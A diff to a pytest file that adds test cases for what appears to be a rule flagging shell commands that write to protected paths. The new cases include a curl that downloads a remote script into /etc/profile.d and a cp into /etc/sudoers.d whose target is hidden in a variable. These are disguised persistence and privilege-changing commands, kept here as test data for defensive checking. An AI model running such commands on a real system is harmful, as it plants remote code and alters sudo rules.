@@ -251,6 +251,11 @@ MAIN_WRITES = [
         _bash("curl -fsSLo/etc/profile.d/tool.sh https://example.com/tool.sh 2>&1"),
         id="attached-short-option-cluster-5",
     ),
+    pytest.param(
+        _bash("curl -4fsSLo/etc/profile.d/tool.sh https://example.com/tool.sh 2>&1"),
+        id="attached-option-cluster-with-digit",
+    ),
+    pytest.param(_bash("OPTS=-t/etc/sudoers.d; cp $OPTS /tmp/agent 2>&1"), id="attached-short-option-assigned"),
     # A read the keyword rule still flags, as documented.
     pytest.param(_bash("cat ~/.bashrc 2>/dev/null"), id="keyword-rule-read"),
 ]
